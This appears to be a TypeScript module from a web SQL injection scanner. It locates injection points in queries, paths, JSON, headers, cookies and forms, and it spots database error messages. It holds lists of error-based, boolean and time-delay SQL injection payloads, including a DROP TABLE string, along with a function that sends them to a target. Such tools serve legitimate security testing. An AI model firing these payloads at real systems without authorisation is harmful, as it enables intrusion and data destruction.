import axios, {
  type AxiosInstance,
  type AxiosRequestConfig,
  type AxiosResponse,
} from "axios";
import * as cheerio from "cheerio";
import { URL as NodeURL } from "url";
import type {
  InjectionPoint,
  ScanInput,
  DiscoveredTarget,
  Method,
} from "./types.js";

// HTTP client utilities
export function buildClient(
  timeoutMs: number,
  headers?: Record<string, string>,
  cookies?: Record<string, string>
): AxiosInstance {
  const defaultHeaders: Record<string, string> = {
    "User-Agent":
      "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
    ...headers,
  };

  if (cookies) {
    const cookieString = Object.entries(cookies)
      .map(([key, value]) => `${key}=${value}`)
      .join("; ");
    defaultHeaders["Cookie"] = cookieString;
  }

  return axios.create({
    timeout: timeoutMs,
    headers: defaultHeaders,
    validateStatus: () => true, // Don't throw on HTTP errors
    maxRedirects: 5,
  });
}

// Injection point discovery
export function discoverQueryPoints(url: URL): InjectionPoint[] {
  const points: InjectionPoint[] = [];
  url.searchParams.forEach((_, name) => {
    points.push({ kind: "query", name });
  });
  return points;
}

export function discoverPathPoints(url: URL): InjectionPoint[] {
  const segments = url.pathname.split("/").filter(Boolean);
  return segments.map((segment, index) => ({
    kind: "path" as const,
    name: `segment_${index}`,
    meta: { segment, position: index },
  }));
}

export function discoverJsonPoints(
  jsonBody?: Record<string, unknown>
): InjectionPoint[] {
  if (!jsonBody || typeof jsonBody !== "object") return [];

  const points: InjectionPoint[] = [];
  function traverse(obj: any, path: string[] = []): void {
    if (obj && typeof obj === "object") {
      for (const [key, value] of Object.entries(obj)) {
        const currentPath = [...path, key];
        if (typeof value === "string" || typeof value === "number") {
          points.push({
            kind: "json",
            name: currentPath.join("."),
            meta: { path: currentPath, type: typeof value },
          });
        } else if (
          Array.isArray(value) ||
          (value && typeof value === "object")
        ) {
          traverse(value, currentPath);
        }
      }
    }
  }

  traverse(jsonBody);
  return points;
}

export function discoverHeaderCookiePoints(
  headers?: Record<string, string>,
  cookies?: Record<string, string>
): InjectionPoint[] {
  const points: InjectionPoint[] = [];

  if (headers) {
    for (const name of Object.keys(headers)) {
      points.push({ kind: "header", name });
    }
  }

  if (cookies) {
    for (const name of Object.keys(cookies)) {
      points.push({ kind: "cookie", name });
    }
  }

  return points;
}

// Form discovery
export async function fetchAndDiscoverForms(
  client: AxiosInstance,
  url: string
): Promise<{ points: InjectionPoint[]; forms: Record<string, any>[] }> {
  try {
    const response = await client.get(url);
    const html = response.data;
    const { forms } = extractLinksAndForms(url, html);

    const points: InjectionPoint[] = [];
    for (const form of forms) {
      if (form.kind === "form") {
        for (const field of form.fields) {
          points.push({
            kind: "form",
            name: field.name,
            meta: { action: form.action, method: form.method },
          });
        }
      }
    }

    return { points, forms: forms as any[] };
  } catch {
    return { points: [], forms: [] };
  }
}

// HTML parsing utilities
export async function fetchHtml(
  client: AxiosInstance,
  url: string
): Promise<string | null> {
  try {
    const response = await client.get(url);
    if (response.status >= 400) return null;
    const contentType = response.headers["content-type"] || "";
    if (!contentType.includes("text/html")) return null;
    return response.data;
  } catch {
    return null;
  }
}

export function extractLinksAndForms(
  baseUrl: string,
  html: string
): {
  links: string[];
  forms: DiscoveredTarget[];
} {
  const $ = cheerio.load(html);
  const base = new NodeURL(baseUrl);
  const links: string[] = [];
  const forms: DiscoveredTarget[] = [];

  // Extract links
  $("a[href]").each((_: any, el: any) => {
    const href = $(el).attr("href");
    if (href) {
      try {
        const url = new NodeURL(href, base);
        links.push(url.toString());
      } catch {
        // Invalid URL, skip
      }
    }
  });

  // Extract forms
  $("form").each((_: any, form: any) => {
    const action = $(form).attr("action") || baseUrl;
    const method = ($(form).attr("method") || "GET").toUpperCase() as Method;
    const enctype = $(form).attr("enctype");

    const fields: Array<{ name: string; value: string }> = [];
    $(form)
      .find("input[name], select[name], textarea[name]")
      .each((_: any, input: any) => {
        const name = $(input).attr("name");
        const value = $(input).attr("value") || $(input).text() || "";
        if (name) {
          fields.push({ name, value });
        }
      });

    if (fields.length > 0) {
      try {
        const actionUrl = new NodeURL(action, base);
        forms.push({
          kind: "form",
          action: actionUrl.toString(),
          method,
          enctype,
          fields,
        });
      } catch {
        // Invalid action URL, skip
      }
    }
  });

  return { links, forms };
}

// Utility functions
export function sleep(ms: number): Promise<void> {
  return new Promise((resolve) => setTimeout(resolve, ms));
}

export function jitter(): number {
  return Math.random() * 300 + 100; // 100-400ms
}

export function isSameOrigin(url1: string, url2: string): boolean {
  try {
    const u1 = new NodeURL(url1);
    const u2 = new NodeURL(url2);
    return u1.origin === u2.origin;
  } catch {
    return false;
  }
}

// Response analysis
export function bodyToText(response: AxiosResponse): string {
  if (typeof response.data === "string") return response.data;
  if (typeof response.data === "object") return JSON.stringify(response.data);
  return String(response.data || "");
}

export function extractTitle(html: string): string {
  const match = html.match(/<title[^>]*>([^<]*)<\/title>/i);
  return match ? match[1].trim() : "";
}

export function clip(text: string, maxLength = 200): string {
  return text.length > maxLength ? text.substring(0, maxLength) + "..." : text;
}

// SQL injection detection
export function hasSqlError(text: string): boolean {
  const errorPatterns = [
    /mysql.*error/i,
    /warning.*mysql/i,
    /valid MySQL result/i,
    /PostgreSQL.*ERROR/i,
    /Warning.*pg_/i,
    /valid PostgreSQL result/i,
    /Oracle error/i,
    /Oracle.*Driver/i,
    /SQLServer JDBC Driver/i,
    /SqlException/i,
    /OLE DB.*error/i,
    /Unclosed quotation mark/i,
    /quoted string not properly terminated/i,
    /SQL syntax.*error/i,
    /Microsoft.*ODBC.*Driver/i,
    // SQLite
    /SQLITE_ERROR/i,
    /SQLite error/i,
    /SQLite3::SQLException/i,
    /near \".*\": syntax error/i,
    /no such table/i,
    /no such column/i,
  ];

  return errorPatterns.some((pattern) => pattern.test(text));
}

export function similaritySignal(a: string, b: string): number {
  if (a === b) return 1.0;
  if (!a || !b) return 0.0;

  const len = Math.max(a.length, b.length);
  if (len === 0) return 1.0;

  // Simple Levenshtein distance approximation
  const shorter = a.length < b.length ? a : b;
  const longer = a.length < b.length ? b : a;

  if (shorter.length === 0) return 0.0;

  let matches = 0;
  for (let i = 0; i < shorter.length; i++) {
    if (shorter[i] === longer[i]) matches++;
  }

  return matches / longer.length;
}

// Injection payloads
export const errorPayloads = [
  "'",
  '"',
  "\\",
  "')",
  "' OR '1'='1",
  "' OR 1=1--",
  "' OR 1=1 --",
  "'; DROP TABLE users; --",
  "' UNION SELECT null--",
  "1' AND 1=1--",
  "1' AND 1=2--",
  // SQLite specific probes
  "' UNION SELECT 1--",
  "' UNION SELECT 1,2--",
  "' ORDER BY 1--",
  "' ORDER BY 2--",
];

export const booleanPairs = [
  {
    true: "1' AND 1=1--",
    false: "1' AND 1=2--",
    label: "classic_boolean",
  },
  {
    true: "' OR 'a'='a",
    false: "' OR 'a'='b",
    label: "or_boolean",
  },
  {
    true: "1 AND 1=1",
    false: "1 AND 1=2",
    label: "numeric_boolean",
  },
  {
    true: "' OR 1=1--",
    false: "' OR 1=2--",
    label: "sqlite_or_comment",
  },
  {
    true: ") OR 1=1--",
    false: ") OR 1=2--",
    label: "paren_or_comment",
  },
];

export const timePayloads = [
  { p: "'; WAITFOR DELAY '00:00:03'--", label: "mssql_waitfor" },
  { p: "' OR SLEEP(3)--", label: "mysql_sleep" },
  { p: "'; SELECT pg_sleep(3)--", label: "postgresql_sleep" },
  { p: "1; WAITFOR DELAY '00:00:03'--", label: "mssql_waitfor_numeric" },
];

// Injection execution
export async function sendWithInjection(
  client: AxiosInstance,
  input: ScanInput,
  point: InjectionPoint,
  payload: string,
  forms: Record<string, any>[]
): Promise<AxiosResponse> {
  const url = new NodeURL(input.target);

  const config: AxiosRequestConfig = {
    method: input.method || "GET",
    url: input.target,
    headers: { ...input.headers },
  };

  if (input.cookies) {
    const cookieString = Object.entries(input.cookies)
      .map(([key, value]) => `${key}=${value}`)
      .join("; ");
    config.headers = { ...config.headers, Cookie: cookieString };
  }

  switch (point.kind) {
    case "query":
      url.searchParams.set(point.name, payload);
      config.url = url.toString();
      break;

    case "path":
      if (point.meta?.position !== undefined) {
        const segments = url.pathname.split("/").filter(Boolean);
        segments[point.meta.position as number] = encodeURIComponent(payload);
        url.pathname = "/" + segments.join("/");
        config.url = url.toString();
      }
      break;

    case "form":
      config.method = "POST";
      const formData = new URLSearchParams();

      // Find matching form
      const matchingForm = forms.find(
        (f) =>
          f.action === input.target ||
          (f.meta && f.meta.action === input.target)
      );

      if (matchingForm && matchingForm.fields) {
        for (const field of matchingForm.fields) {
          const value = field.name === point.name ? payload : field.value;
          formData.append(field.name, value);
        }
      } else {
        formData.append(point.name, payload);
      }

      config.data = formData;
      config.headers = {
        ...config.headers,
        "Content-Type": "application/x-www-form-urlencoded",
      };
      break;

    case "json":
      if (input.jsonBody) {
        const jsonCopy = JSON.parse(JSON.stringify(input.jsonBody));
        const pathParts = point.name.split(".");
        let current = jsonCopy;

        for (let i = 0; i < pathParts.length - 1; i++) {
          if (!current[pathParts[i]]) current[pathParts[i]] = {};
          current = current[pathParts[i]];
        }

        current[pathParts[pathParts.length - 1]] = payload;
        config.data = jsonCopy;
        config.headers = {
          ...config.headers,
          "Content-Type": "application/json",
        };
      }
      break;

    case "header":
      config.headers = { ...config.headers, [point.name]: payload };
      break;

    case "cookie":
      const existingCookies = config.headers?.Cookie || "";
      const newCookie = `${point.name}=${payload}`;
      config.headers = {
        ...config.headers,
        Cookie: existingCookies
          ? `${existingCookies}; ${newCookie}`
          : newCookie,
      };
      break;
  }

  return client.request(config);
}
